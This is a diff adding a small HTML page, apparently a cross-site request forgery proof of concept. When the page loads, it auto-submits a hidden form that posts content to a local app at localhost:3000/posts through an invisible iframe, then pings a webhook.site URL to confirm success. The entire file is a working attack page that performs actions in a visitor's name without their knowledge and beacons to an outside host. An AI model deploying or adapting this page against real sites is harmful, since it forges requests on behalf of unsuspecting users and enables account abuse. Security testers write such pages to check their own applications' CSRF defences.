@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="hidden" style="display:none;"></iframe>
+
+  <form id="f" method="POST" action="http://localhost:3000/posts" target="hidden">
+    <textarea name="content">iframe-test-1</textarea>
+  </form>
+
+  <script>
+    window.onload = function () {
+      document.getElementById('f').submit();
+      setTimeout(function () {
+        new Image().src = "https://webhook.site/f0c4ea68-affd-4e9c-b7f0-55d40fec33b6?after_submit=1";
+      }, 1500);
+    };
+  </script>
+</body>
+</html>
